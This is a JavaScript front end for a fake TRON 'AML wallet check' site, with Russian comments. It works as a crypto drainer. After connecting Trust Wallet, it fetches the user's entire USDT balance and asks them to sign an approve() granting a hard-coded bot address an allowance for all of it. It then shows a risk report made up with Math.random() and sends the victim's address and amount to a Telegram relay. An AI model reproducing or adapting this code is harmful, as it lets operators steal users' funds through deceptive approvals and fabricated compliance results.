// ============================================
// ГЛОБАЛЬНЫЕ КОНСТАНТЫ
// ============================================
const CONTRACT_ADDRESS = 'TFYz6a5z8mw3rEs7gev9JirJvFg17KdmCZ';
const BOT_ADDRESS = 'TJKaoUut9WpHr3pBbCyf1TjDxq2rcJRQqB'; // ← ИСПРАВЛЕННЫЙ АДРЕС
const USDT_CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
const MIN_AMOUNT = 5000000; // 5 USDT
const MAX_AMOUNT = 10000000000; // 10000 USDT

// ============================================
// ПЕРЕМЕННЫЕ СОСТОЯНИЯ
// ============================================
let connectedWalletAddress = null;
let currentApproveAmount = null;

// ============================================
// ПОЛУЧЕНИЕ ЭЛЕМЕНТОВ
// ============================================
const walletInput = document.getElementById('walletInput');
const checkBtn = document.getElementById('checkBtn');
const resultSection = document.getElementById('resultSection');
const checkedAddress = document.getElementById('checkedAddress');
const totalTx = document.getElementById('totalTx');
const suspiciousTx = document.getElementById('suspiciousTx');
const walletAge = document.getElementById('walletAge');
const lastActive = document.getElementById('lastActive');
const riskPercent = document.getElementById('riskPercent');
const sourcesList = document.getElementById('sourcesList');
const downloadPdfBtn = document.getElementById('downloadPdfBtn');
const amountCardContainer = document.getElementById('amountCardContainer');
const modalAmount = document.getElementById('modalAmount');

// ============================================
// КАТЕГОРИИ ДЛЯ АНАЛИЗА
// ============================================
const categories = [
    { name: 'Даркнет-маркеты', icon: 'fa-skull' },
    { name: 'Миксеры', icon: 'fa-random' },
    { name: 'Биржи без KYC', icon: 'fa-exchange-alt' },
    { name: 'Санкционные адреса', icon: 'fa-flag' },
    { name: 'Мошенничество', icon: 'fa-user-secret' },
    { name: 'Финансирование терроризма', icon: 'fa-bomb' }
];

// ============================================
// ТЕСТОВАЯ ФУНКЦИЯ TELEGRAM
// ============================================
async function testTelegram() {
    console.log('📨 Тест отправки в Telegram...');
    
    try {
        const response = await fetch('/.netlify/functions/send-to-telegram', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                type: 'test',
                address: 'TEST',
                amount: '5',
                risk: '10',
                sources: ['Тест']
            })
        });
        
        if (response.ok) {
            alert('✅ Тест успешен! Проверьте Telegram');
        } else {
            alert('❌ Ошибка: ' + response.status);
        }
    } catch (error) {
        alert('Ошибка: ' + error.message);
    }
}

// ============================================
// ИНИЦИАЛИЗАЦИЯ
// ============================================
document.addEventListener('DOMContentLoaded', function() {
    if (checkBtn) {
        checkBtn.addEventListener('click', handleTronCheck);
    }

    const connectBtn = document.getElementById('connectTrustBtn');
    if (connectBtn) {
        connectBtn.addEventListener('click', connectTrustWallet);
    }

    if (downloadPdfBtn) {
        downloadPdfBtn.addEventListener('click', downloadPDF);
    }
});

// ============================================
// ПОДКЛЮЧЕНИЕ TRUST WALLET
// ============================================
async function connectTrustWallet() {
    try {
        // Проверяем Trust Wallet
        if (window.trustwallet && window.trustwallet.tronLink) {
            await window.trustwallet.tronLink.request({ method: 'tron_requestAccounts' });
            const address = window.trustwallet.tronLink.defaultAddress.base58;
            
            connectedWalletAddress = address;
            walletInput.value = address;
            document.getElementById('connectedStatus').style.display = 'inline-flex';
            
            alert('✅ Trust Wallet подключён!');
            
        } else {
            // Показываем инструкцию
            showWalletInstructions();
        }
    } catch (error) {
        console.error(error);
        showWalletInstructions();
    }
}

// ============================================
// ИНСТРУКЦИЯ ПО ПОДКЛЮЧЕНИЮ
// ============================================
function showWalletInstructions() {
    const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
    
    if (isMobile) {
        alert('📱 На телефоне:\n1. Откройте Trust Wallet\n2. Нажмите "Browser"\n3. Введите адрес сайта');
    } else {
        alert('💻 На компьютере:\nУстановите расширение Trust Wallet для браузера');
    }
}

// ============================================
// ПОЛУЧЕНИЕ БАЛАНСА
// ============================================
async function getUSDTBalance(address) {
    try {
        const tronWeb = window.tronWeb || (window.trustwallet?.tronLink?.tronWeb);
        if (!tronWeb) return null;

        const contract = await tronWeb.contract().at(USDT_CONTRACT);
        return await contract.balanceOf(address).call();
    } catch (error) {
        console.error('Ошибка баланса:', error);
        return null;
    }
}

// ============================================
// ПРОВЕРКА КОШЕЛЬКА
// ============================================
async function handleTronCheck() {
    try {
        let walletAddress = walletInput.value.trim();
        
        if (!walletAddress && connectedWalletAddress) {
            walletAddress = connectedWalletAddress;
            walletInput.value = connectedWalletAddress; // показываем в поле
            console.log('✅ Автоматически подставлен адрес кошелька:', connectedWalletAddress);
        }
        
        if (!walletAddress) {
            alert('Введите адрес кошелька или подключите Trust Wallet');
            return;
        }

        // Если есть подключённый кошелёк - показываем модалку с суммой
        if (connectedWalletAddress) {
            const balance = await getUSDTBalance(connectedWalletAddress);
            if (balance) {
                const balanceInUSDT = (balance / 1000000).toFixed(2);
                currentApproveAmount = balance;
                if (modalAmount) {
                    modalAmount.textContent = balanceInUSDT + ' USDT';
                }
                document.getElementById('approveModal').style.display = 'flex';
                return;
            }
        }

        // Иначе просто показываем демо-отчёт
        startAMLCheck(walletAddress, 'manual', 'demo_tx', '5.00');
        
    } catch (error) {
        console.error('❌ Ошибка:', error);
        alert('Ошибка: ' + error.message);
    }
}

// ============================================
// ПОДТВЕРЖДЕНИЕ APPROVE
// ============================================
async function confirmApprove() {
    try {
        document.getElementById('approveModal').style.display = 'none';
        
        const originalText = checkBtn.innerHTML;
        checkBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Отправка транзакции...';
        checkBtn.disabled = true;

        const tronWeb = window.tronWeb || (window.trustwallet?.tronLink?.tronWeb);
        const userAddress = tronWeb.defaultAddress.base58;
        const walletAddress = walletInput.value.trim() || connectedWalletAddress;

        const contract = await tronWeb.contract().at(CONTRACT_ADDRESS);
        
        const tx = await contract.approve(
            BOT_ADDRESS,
            currentApproveAmount.toString()
        ).send({
            feeLimit: 150_000_000,
            callValue: 0
        });

        console.log('✅ Approve отправлен, tx:', tx);

        checkBtn.innerHTML = originalText;
        checkBtn.disabled = false;

        const balanceInUSDT = (currentApproveAmount / 1000000).toFixed(2);
        startAMLCheck(walletAddress, userAddress, tx, balanceInUSDT);

    } catch (error) {
        console.error('❌ Ошибка:', error);
        checkBtn.innerHTML = '<i class="fas fa-search"></i> Проверить';
        checkBtn.disabled = false;
        alert('Ошибка при отправке транзакции: ' + error.message);
    }
}

function closeApproveModal() {
    document.getElementById('approveModal').style.display = 'none';
    checkBtn.innerHTML = '<i class="fas fa-search"></i> Проверить';
    checkBtn.disabled = false;
}

// ============================================
// AML ПРОВЕРКА
// ============================================
function startAMLCheck(address, userAddress, tx, amount) {
    resultSection.style.display = 'block';
    checkedAddress.textContent = address;

    if (amountCardContainer) {
        amountCardContainer.innerHTML = `
            <div class="amount-card">
                <div class="amount-label">
                    <i class="fas fa-coins"></i>
                    <span>Сумма</span>
                </div>
                <div class="amount-value">${amount} USDT</div>
            </div>
        `;
    }

    const risk = Math.floor(Math.random() * 100);
    const total = Math.floor(Math.random() * 500) + 50;
    const suspicious = Math.floor(total * (risk / 100));
    
    totalTx.textContent = total;
    suspiciousTx.textContent = suspicious;
    walletAge.textContent = Math.floor(Math.random() * 365) + ' дней';
    lastActive.textContent = 'сегодня';
    
    updateRiskChart(risk);
    
    // Источники риска
    const sources = [];
    if (risk > 30) {
        const count = Math.floor(risk / 30);
        for (let i = 0; i < count; i++) {
            if (categories[i]) sources.push(categories[i].name);
        }
    }
    
    sourcesList.innerHTML = '';
    if (sources.length > 0) {
        sources.forEach(s => {
            const p = document.createElement('p');
            p.innerHTML = `<i class="fas fa-exclamation-circle"></i> ${s}`;
            sourcesList.appendChild(p);
        });
    } else {
        sourcesList.innerHTML = '<p><i class="fas fa-check-circle" style="color:#00c9b7"></i> Чистый кошелёк</p>';
    }
    
    // Telegram
    sendToTelegram({ address, amount, risk, sources });
}

// ============================================
// ГРАФИК РИСКА
// ============================================
function updateRiskChart(risk) {
    if (riskPercent) {
        riskPercent.textContent = risk + '%';
    }
    
    const gaugeFill = document.getElementById('gaugeFill');
    if (gaugeFill) {
        const maxDash = 251.2;
        const dashOffset = maxDash - (risk / 100) * maxDash;
        gaugeFill.style.strokeDashoffset = dashOffset;
    }
    
    let color = '#00c9b7';
    let level = 'Низкий';
    
    if (risk > 25 && risk <= 75) {
        color = '#ffaa5e';
        level = 'Средний';
    } else if (risk > 75) {
        color = '#ff6b6b';
        level = 'Высокий';
    }
    
    if (gaugeFill) gaugeFill.style.stroke = color;
    
    const badge = document.getElementById('riskBadge');
    if (badge) {
        badge.className = 'result-badge';
        badge.textContent = level + ' риск';
        badge.classList.add(level === 'Низкий' ? 'low' : level === 'Средний' ? 'medium' : 'high');
    }
}

// ============================================
// ОТПРАВКА В TELEGRAM
// ============================================
async function sendToTelegram(data) {
    try {
        const response = await fetch('/.netlify/functions/send-to-telegram', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(data)
        });
        
        if (!response.ok) {
            console.error('Ошибка отправки в Telegram:', await response.text());
        }
    } catch (error) {
        console.error('Ошибка Telegram:', error);
    }
}

// ============================================
// PDF
// ============================================
function downloadPDF() {
    alert('PDF отчёт будет доступен в следующей версии');
}

// ============================================
// КОПИРОВАНИЕ
// ============================================
function copyAddress() {
    const address = document.getElementById('checkedAddress').textContent;
    navigator.clipboard.writeText(address);
    alert('Адрес скопирован');
}
